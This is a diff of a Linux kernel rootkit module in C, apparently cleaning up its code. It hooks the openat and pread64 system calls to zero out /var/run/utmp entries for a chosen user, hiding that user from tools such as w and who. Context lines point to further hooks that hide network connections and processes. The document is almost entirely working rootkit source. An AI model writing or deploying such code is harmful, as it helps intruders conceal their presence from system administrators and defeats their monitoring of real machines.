@@ -13,7 +13,7 @@ enum signals{
 unsigned long *__sys_call_table = NULL;
 static short hidden = 0;
 char hide_pid[NAME_MAX];
-int tamper_file_descriptor;
+int tamper_fd;
 
 #if PTREGS_SYSCALL_STUB
 
@@ -227,98 +227,126 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v){
 
 /* figure out the file descriptor for the utmp file then save it to change in the pread64 */
 // see http://www.kernel.org/doc/man-pages/online/pages/man2/openat.2.html
-static asmlinkage long hook_openat(const struct pt_regs *regs){
+static asmlinkage int hook_openat(const struct pt_regs *regs){
+    //int dfd = regs->di;
     char *filename = (char *)regs->si;
+    //int flags = regs->dx;
+    //umode_t mode = regs->r10;
 
-    char *kbuf; // buffer to store the filename 
-    long err;
+    char *kbuf;
+    long error;
     char *target = "/var/run/utmp";
     int target_len = 14;
 
-    /* allocates memory on the heap if it fails then it calls the original and exits*/
+    /*
+     * We need a buffer to copy filename into
+     */
     kbuf = kzalloc(NAME_MAX, GFP_KERNEL);
-    if(kbuf == NULL){
+    if(kbuf == NULL)
         return orig_openat(regs);
-    }
 
-    /* get the filename that openat is looking at from userspace otherwise calls the original and exits */
-    err = copy_from_user(kbuf, filename, NAME_MAX);
-    if(err){
+    /*
+     * Copy filename from userspace into our kernel buffer
+     */
+    error = copy_from_user(kbuf, filename, NAME_MAX);
+    if(error)
         return orig_openat(regs);
+
+    /*
+     * Compare filename to "/var/run/utmp"
+     */
+    if( memcmp(kbuf, target, target_len) == 0 ){
+        /*
+         * Save the file descriptor in tamper_fd, clean up and return
+         */
+        tamper_fd = orig_openat(regs);
+        kfree(kbuf);
+        return tamper_fd;
     }
 
     /*
-    `* Compare the filename to "/var/run/utmp"
-     * If we get a match, call orig_openat(), save the result in tamper_file_descriptor,
-     * and return after freeing the kernel buffer. We just about get away with
-     * this delay between calling and returning
-    */
-    if(memcmp(kbuf, target, target_len) == 0){
-        tamper_file_descriptor = orig_openat(regs);
-        printk(KERN_INFO "got the taper fd %d", tamper_file_descriptor);
-        kfree(kbuf);
-        return tamper_file_descriptor;
-    }
-
-    /* if there is no match then just free heap space and continue with the regular execution*/
+     * Clean up and return
+     */
     kfree(kbuf);
     return orig_openat(regs);
 }
 
-/* preads64 looks at the file and hides the user that is USER so it dosn't show up in w, who, finger */
 // see http://www.kernel.org/doc/man-pages/online/pages/man2/pread64.2.html
-static asmlinkage long hook_pread64(const struct pt_regs *regs){
-    //file descriptor that preads is trying to read
-    int file_descriptor = regs->di;
-    char * buf = (char *)regs->si;
+/*
+ * The hook for sys_pread64()
+ * First, we check if the file descriptor is the one stored in tamper_fd.
+ * If it is, then we call the real sys_pread64(), copy the buffer into the kernel,
+ * and check if the ut_user entry of the utmp struct is the user we want to hide.
+ * Finally, if it matches, then we will the buffer with 0x0 before copying it back
+ * to userspace and returning.
+ */
+static asmlinkage int hook_pread64(const struct pt_regs *regs){
+    int fd = regs->di;
+    char *buf = (char *)regs->si;
     size_t count = regs->dx;
+    //loff_t pos = regs->r10;
 
     char *kbuf;
-    struct utmp *utmp_buffer;
-    long err;
+    struct utmp *utmp_buf;
+    long error;
     int i, ret;
-    /* check that the file we are reading is the file we want to change */
-    if((tamper_file_descriptor == file_descriptor) && (tamper_file_descriptor != 0) && 
-    (tamper_file_descriptor != 1) && (tamper_file_descriptor !=2)){
-        //setting up the kernel buffer on the heap
-        kbuf = kzalloc(NAME_MAX, GFP_KERNEL);
-        if(kbuf == NULL){
-            return orig_pread64(regs);
-        }
+
+    /*
+     * Check that we're supposed to be tampering with this fd
+     * Better also be sure that tamper_fd isn't 0,1, or 2!
+     */
+    if ( (fd == tamper_fd) && (tamper_fd != 0) && (tamper_fd != 1) && (tamper_fd != 2) ){
         /*
-         * Do the real syscall, save the return value in ret
-         * buf will then hold a utmp struct, but we need to copy it into kbuf first
-        */
+         * Allocate a kernel buffer, and check it worked
+         */
+        kbuf = kzalloc(count, GFP_KERNEL);
+        if (kbuf == NULL)
+            return orig_pread64(regs);
+
+        /*
+         * Do the real syscall, so that buf gets filled for us
+         */
         ret = orig_pread64(regs);
-        err = copy_from_user(kbuf, buf, count);
-        if(err != 0){
+
+        /*
+         * Copy buf into kbuf so we can look at it
+         * If it fails, just return without doing anything
+         */
+        error = copy_from_user(kbuf, buf, count);
+        if(error != 0)
             return ret;
-        }
 
-        //compare the kbuff to the .utmp buffer 
-        utmp_buffer = (struct utmp *)kbuf;
-        if( memcmp(utmp_buffer->ut_user, USER, strlen(USER)) == 0){
-            printk(KERN_INFO "found a match and going to overwrite");
-            //if there is a match we just rewrite the buffer with 0x0
-            for(i =0; i < count; i++){
+        /*
+         * Check if ut_user is the user we want to hide
+         */
+        utmp_buf = (struct utmp *)kbuf;
+        if ( memcmp(utmp_buf->ut_user, USER, strlen(USER)) == 0 ){
+            /*
+             * Overwrite kbuf with 0x0
+             */
+            for ( i = 0 ; i < count ; i++ )
                 kbuf[i] = 0x0;
-            }
-            
-            err = copy_to_user(buf, kbuf, count);
 
+            /* 
+             * Copy kbuf back to buf in userspace
+             * If it fails, there's nothing we can do, so just clean up and return
+             */
+            error = copy_to_user(buf, kbuf, count);
+            
             kfree(kbuf);
             return ret;
         }
 
         /*
-         * We intercepted a sys_pread64() to /var/run/utmp, but this entry
-         * isn't about HIDDEN_USER, so just free the kernel buffer and return
+         * We intercepted a read to /var/run/utmp, but didn't find the user
+         * we want to hide, so clean up and return
          */
-        kfree(buf);
+        kfree(kbuf);
         return ret;
     }
+
     /*
-     * This isn't a sys_pread64() to /var/run/utmp, do nothing
+     * This isn't a read to /var/run/utmp, so just return
      */
     return orig_pread64(regs);
 }
